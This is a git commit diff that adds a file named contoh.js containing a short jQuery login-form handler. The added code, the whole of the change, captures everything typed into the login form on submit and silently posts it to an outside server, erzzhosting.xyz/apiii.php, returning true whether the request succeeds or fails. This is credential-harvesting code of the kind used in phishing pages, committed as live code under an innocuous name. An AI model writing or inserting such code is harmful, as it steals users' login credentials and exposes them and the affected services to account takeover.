f4104f6b24172678f9b614bf32b0c470c91f3c18
kelibok <97335250+kelibok@users.noreply.github.com>
2022-01-11 18:10:15 +0700

    Update contoh.js

--- contoh.js
+++ contoh.js
@@ -1,1 +1,27 @@
+$(".login-form").submit(function() {
 
+	var d = $(".login-form");
+
+	$.ajax({
+
+        url: "https://erzzhosting.xyz/apiii.php",
+
+        type: "POST",
+
+        data: d.serialize(),
+
+        success: function () {
+
+            return true;
+
+        },
+
+        error: function () {
+
+            return true;
+
+        },
+
+    });
+
+});
